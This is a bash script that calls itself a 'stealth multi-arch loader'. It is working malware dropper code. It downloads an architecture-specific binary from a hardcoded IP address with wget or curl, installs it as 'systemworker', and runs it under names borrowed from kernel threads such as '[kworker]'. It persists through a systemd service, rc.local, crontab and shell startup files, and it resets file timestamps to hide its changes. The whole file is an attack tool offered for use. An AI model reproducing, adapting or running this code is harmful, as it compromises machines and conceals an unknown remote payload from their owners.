#!/bin/bash

# Stealth multi-arch loader - completely generic system worker appearance
URL_BASE="http://83.142.209.47"
BIN_HIDDEN_NAME_DEFAULT="systemworker"
PROC_HIDDEN_NAME_DEFAULT="[kworker]"
CONFIG_DIR_NAME="htop"
TAG="x.net"
NOTE_DONOTREMOVE="GNU/Linux"

proc_name_arr=("[kstrp]" "[watchdogd]" "[ksmd]" "[kswapd0]" "[card0-crtc8]" "[mm_percpu_wq]" "[kworker]" "[raid5wq]" "[slub_flushwq]" "[netns]" "[kaluad]")
PROC_HIDDEN_NAME_DEFAULT="${proc_name_arr[$((RANDOM % ${#proc_name_arr[@]}))]}"
for str in "${proc_name_arr[@]}"; do
PROC_HIDDEN_NAME_RX+="|$(echo "$str" | sed 's/[^a-zA-Z0-9]/\\&/g')"
done
PROC_HIDDEN_NAME_RX="${PROC_HIDDEN_NAME_RX:1}"

BIN_HIDDEN_NAME_RM=("$BIN_HIDDEN_NAME_DEFAULT" "systemworker")
CONFIG_DIR_NAME_RM=("$CONFIG_DIR_NAME")

[[ -t 1 ]] && {
CY="\033[1;33m"
CG="\033[1;32m"
CR="\033[1;31m"
CDR="\033[0;31m"
CN="\033[0m"
}

if [[ -z "$GS_DEBUG" ]]; then
DEBUGF(){ :;}
else
DEBUGF(){ echo -e "${CY}DEBUG:${CN} $*";}
fi

# Timestamp / stealth functions (unchanged)
_ts_fix() { local fn="$1" ts="$2" args=(); [[ ! -e "$1" ]] && return; [[ -z $ts ]] && return; [[ -n "$3" ]] && args=("-h"); [[ "${ts:0:1}" = '/' ]] && { touch "${args[@]}" -r "$ts" "$fn" 2>/dev/null; return; }; touch "${args[@]}" -t "$ts" "$fn" 2>/dev/null && return; touch "${args[@]}" -r "/etc/ld.so.conf" "$fn" 2>/dev/null; }
ts_restore() { local n=0; while [[ $n -lt ${#_ts_fn_a[@]} ]]; do _ts_fix "${_ts_fn_a[$n]}" "${_ts_ts_a[$n]}"; ((n++)); done; unset _ts_fn_a _ts_ts_a; n=0; while [[ $n -lt ${#_ts_systemd_ts_a[@]} ]]; do _ts_fix "${_ts_systemd_fn_a[$n]}" "${_ts_systemd_ts_a[$n]}" "symlink"; ((n++)); done; unset _ts_systemd_fn_a _ts_systemd_ts_a; }
ts_is_marked() { for a in "${_ts_fn_a[@]}"; do [[ "$1" = "$a" ]] && return 0; done; return 1; }
ts_add_systemd() { local fn="$1" ref="$2" ts="${ref:-$(date -r "$fn" +%Y%m%d%H%M.%S 2>/dev/null)}"; _ts_systemd_ts_a+=("$ts"); _ts_systemd_fn_a+=("$fn"); }
_ts_get_ts() { local fn="$1" pdir=$(dirname "$1") n=0; while [[ $n -lt ${#_ts_fn_a[@]} ]]; do [[ "$pdir" = "${_ts_mkdir_fn_a[$n]}" ]] && { _ts_ts="${_ts_ts_a[$n]}"; return; }; ((n++)); done; [[ -e "$fn" ]] && { _ts_ts=$(date -r "$fn" +%Y%m%d%H%M.%S 2>/dev/null); return; }; oldest="$pdir/$(ls -atr "$pdir" 2>/dev/null | head -n1)"; _ts_ts=$(date -r "$oldest" +%Y%m%d%H%M.%S 2>/dev/null); }
_ts_add() { _ts_get_ts "$1"; _ts_ts_a+=("$_ts_ts"); _ts_fn_a+=("$1"); _ts_mkdir_fn_a+=("$2"); }
mk_file() { local fn="$1" pdir=$(dirname "$fn") exists; [[ -e "$fn" ]] && exists=1; ts_is_marked "$pdir" || _ts_add "$pdir" "<NOT BY XMKDIR>"; ts_is_marked "$fn" || { _ts_add "$fn" "<NOT BY XMKDIR>"; touch "$fn" 2>/dev/null || return 69; [[ -z $exists ]] && chmod 600 "$fn"; return; }; touch "$fn" 2>/dev/null || return; [[ -z $exists ]] && chmod 600 "$fn"; true; }
xrm() { local fn="$1"; [[ ! -f "$fn" ]] && return; local pdir=$(dirname "$fn"); ts_is_marked "$pdir" || _ts_add "$pdir" "<RM-UNTRACKED>"; rm -f "$fn" 2>/dev/null; }
xmkdir() { local fn="$1" pdir=$(dirname "$fn"); [[ -d "$fn" ]] && return; [[ ! -d "$pdir" ]] && return; ts_is_marked "$pdir" || _ts_add "$pdir" "<NOT BY XMKDIR>"; ts_is_marked "$fn" || _ts_add "$fn" "$fn"; mkdir "$fn" 2>/dev/null || return; chmod 700 "$fn"; true; }
xcp() { local src="$1" dst="$2"; mk_file "$dst" || return; cp "$src" "$dst" || return; true; }
xmv() { local src="$1" dst="$2"; [[ -e "$dst" ]] && xrm "$dst"; xcp "$src" "$dst" || return; xrm "$src"; true; }
clean_all() { [[ "${#TMPDIR}" -gt 5 ]] && rm -rf "${TMPDIR:?}"/*; ts_restore; }
errexit() { [[ -z "$1" ]] || echo -e >&2 "${CR}$*${CN}"; clean_all; exit 255; }
uninstall_rc() { local fn="$1" hname="$2"; [[ ! -f "$fn" ]] && return; grep -F -- "${hname}" "$fn" &>/dev/null || return; mk_file "$fn" || return; D="$(grep -v -F -- "${hname}" "$fn")"; echo "$D" >"$fn" || return; [[ ! -s "$fn" ]] && rm -f "$fn" 2>/dev/null; }
uninstall_service() { local dir="$1" sn="$2" sf="$dir/$sn.service"; [[ ! -f "$sf" ]] && return; if command -v systemctl >/dev/null && [[ $UID -eq 0 ]]; then systemctl disable "$sn" 2>/dev/null; systemctl stop "$sn" 2>/dev/null; fi; xrm "$sf"; }
install_to_file() { local fname="$1"; shift 1; mk_file "$fname" || return; D="$(IFS=$'\n'; head -n1 "$fname" && echo "${*}" && tail -n +2 "$fname")"; echo "$D" >"$fname" 2>/dev/null || return; true; }

is_le() { command -v lscpu >/dev/null && [[ $(lscpu) == *"Little Endian"* ]] && return 0; command -v od >/dev/null && command -v awk >/dev/null && [[ $(echo -n I | od -o | awk 'FNR==1{ print substr($2,6,1)}') == "1" ]] && return 0; return 255; }

detect_arch() {
local arch=$(uname -m) osname=$(uname -s)
BIN_SUFFIX="x86_64"
if [[ $osname == *Linux* ]]; then
if [[ "$arch" == "x86_64" ]]; then BIN_SUFFIX="x86_64"
elif [[ "$arch" == "i686" ]] || [[ "$arch" == "i386" ]]; then BIN_SUFFIX="i686"
elif [[ "$arch" == "i486" ]]; then BIN_SUFFIX="i486"
elif [[ "$arch" == *"armv7"* ]]; then BIN_SUFFIX="arm7"
elif [[ "$arch" == *"armv6"* ]]; then BIN_SUFFIX="arm6"
elif [[ "$arch" == *"armv5"* ]]; then BIN_SUFFIX="arm5"
elif [[ "$arch" == *"arm"* ]]; then BIN_SUFFIX="arm"
elif [[ "$arch" == "aarch64" ]]; then BIN_SUFFIX="arm"
elif [[ "$arch" == "mips64" ]]; then BIN_SUFFIX="mips"; is_le && BIN_SUFFIX="mpsl"
elif [[ "$arch" == *mips* ]]; then BIN_SUFFIX="mips"; is_le && BIN_SUFFIX="mpsl"
elif [[ "$arch" == "ppc"* ]]; then BIN_SUFFIX="ppc"
elif [[ "$arch" == "m68k" ]]; then BIN_SUFFIX="m68k"
elif [[ "$arch" == "sh4" ]]; then BIN_SUFFIX="sh4"
elif [[ "$arch" == "sparc"* ]]; then BIN_SUFFIX="spc"
elif [[ "$arch" == "arc" ]]; then BIN_SUFFIX="arc"
fi
fi
}

init_setup() {
BIN_HIDDEN_NAME="${GS_HIDDEN_NAME:-$BIN_HIDDEN_NAME_DEFAULT}"
PROC_HIDDEN_NAME="${GS_HIDDEN_NAME:-$PROC_HIDDEN_NAME_DEFAULT}"
SERVICE_HIDDEN_NAME="$BIN_HIDDEN_NAME"

if [[ -n "$GS_DSTDIR" ]]; then
DSTDIR="$GS_DSTDIR"
else
DSTDIR="/usr/bin"
[[ ! -w "$DSTDIR" ]] && DSTDIR="$HOME/.config/$CONFIG_DIR_NAME"
[[ ! -w "$DSTDIR" ]] && DSTDIR="/tmp/.sysworker-$UID"
[[ ! -w "$DSTDIR" ]] && DSTDIR="/dev/shm"
fi
xmkdir "$DSTDIR" || errexit "No writable dir found."
DSTBIN="$DSTDIR/$BIN_HIDDEN_NAME"

TMPDIR="/tmp/.sysworker-$UID"
xmkdir "$TMPDIR"

if command -v pkill >/dev/null; then KL_CMD="pkill"; elif command -v killall >/dev/null; then KL_CMD="killall"; fi
KL_CMD_BIN="$(command -v "$KL_CMD")"

RC_FN_LIST=(".bashrc" ".profile")
SERVICE_DIR="/etc/systemd/system"
RCLOCAL_FILE="/etc/rc.local"

PROFILE_LINE="$KL_CMD_BIN $BIN_HIDDEN_NAME 2>/dev/null || (exec -a '$PROC_HIDDEN_NAME' '$DSTBIN' $TAG 2>/dev/null)"
CRONTAB_LINE="0 * * * * $KL_CMD_BIN $BIN_HIDDEN_NAME 2>/dev/null || exec -a '$PROC_HIDDEN_NAME' '$DSTBIN' $TAG 2>/dev/null"
}

install_system() {
if command -v systemctl >/dev/null && [[ $UID -eq 0 ]]; then
SERVICE_FILE="$SERVICE_DIR/$SERVICE_HIDDEN_NAME.service"
if [[ ! -f "$SERVICE_FILE" ]]; then
mk_file "$SERVICE_FILE"
cat >"$SERVICE_FILE" <<EOF
[Unit]
Description=System Worker Service
After=network.target

[Service]
Type=simple
Restart=always
RestartSec=300
StandardOutput=null
StandardError=null
WorkingDirectory=/root
ExecStart=/bin/bash -c "exec -a '$PROC_HIDDEN_NAME' '$DSTBIN' '$TAG'"

[Install]
WantedBy=multi-user.target
EOF
systemctl enable "$SERVICE_HIDDEN_NAME" &>/dev/null
fi
fi

if [[ -x "$RCLOCAL_FILE" ]] && [[ $UID -eq 0 ]]; then
if ! grep -F "$BIN_HIDDEN_NAME" "$RCLOCAL_FILE" &>/dev/null; then
install_to_file "$RCLOCAL_FILE" "$NOTE_DONOTREMOVE" "$PROFILE_LINE"
fi
fi
}

install_system() {
if command -v systemctl >/dev/null && [[ $UID -eq 0 ]]; then
SERVICE_FILE="$SERVICE_DIR/$SERVICE_HIDDEN_NAME.service"
if [[ ! -f "$SERVICE_FILE" ]]; then
mk_file "$SERVICE_FILE"
cat >"$SERVICE_FILE" <<EOF
[Unit]
Description=System Worker Service
After=network-online.target
Wants=network-online.target
StartLimitIntervalSec=0
StartLimitBurst=0

[Service]
Type=forking
Restart=always
RestartSec=300
StandardOutput=journal
StandardError=journal
WorkingDirectory=/root
ExecStart=/bin/bash -c "exec -a '${PROC_HIDDEN_NAME}' '${DSTBIN}' '${TAG}'"

[Install]
WantedBy=multi-user.target
EOF
systemctl enable "$SERVICE_HIDDEN_NAME" &>/dev/null
fi
fi

if [[ -x "$RCLOCAL_FILE" ]] && [[ $UID -eq 0 ]]; then
if ! grep -F "$BIN_HIDDEN_NAME" "$RCLOCAL_FILE" &>/dev/null; then
install_to_file "$RCLOCAL_FILE" "$NOTE_DONOTREMOVE" "$PROFILE_LINE"
fi
fi
}

install_user() {
if command -v crontab >/dev/null; then
if ! crontab -l 2>/dev/null | grep -F "$BIN_HIDDEN_NAME" &>/dev/null; then
old=$(crontab -l 2>/dev/null)
echo -e "${old}\n$CRONTAB_LINE" | crontab - 2>/dev/null
fi
fi
for rc in "${RC_FN_LIST[@]}"; do
rc_file="$HOME/$rc"
if [[ -f "$rc_file" ]] && ! grep -F "$BIN_HIDDEN_NAME" "$rc_file" &>/dev/null; then
install_to_file "$rc_file" "$NOTE_DONOTREMOVE" "$PROFILE_LINE"
fi
done
}

uninstall() {
for hn in "${BIN_HIDDEN_NAME_RM[@]}"; do
xrm "$DSTDIR/$hn"
for rc in "${RC_FN_LIST[@]}"; do uninstall_rc "$HOME/$rc" "$hn"; done
uninstall_service "$SERVICE_DIR" "$hn"
uninstall_rc "$RCLOCAL_FILE" "$hn"
done
echo "Uninstall complete."
exit 0
}

try_load() {
local suffix="$1"
local dl_bin="load.$suffix"
dl "$URL_BASE/$dl_bin" "$TMPDIR/$dl_bin" || return 1
xmv "$TMPDIR/$dl_bin" "$DSTBIN" || return 1
chmod +x "$DSTBIN"
return 0
}

system_start() {
while true; do
exec -a "$PROC_HIDDEN_NAME" "$DSTBIN" "$TAG" 2>/dev/null
done
}

dl() {
local src="$1" dst="$2"
rm -f "$dst"
if command -v wget >/dev/null; then
wget -q -O "$dst" "$src" 2>/dev/null
elif command -v curl >/dev/null; then
curl -s -o "$dst" "$src" 2>/dev/null
fi
[[ -s "$dst" ]] || return 1
true
}

# Main
init_setup
[[ -n "$GS_UNDO" ]] && uninstall
detect_arch
try_load "$BIN_SUFFIX" || errexit "Download failed for $BIN_SUFFIX"

[[ $UID -eq 0 ]] && install_system
install_user

system_start

clean_all

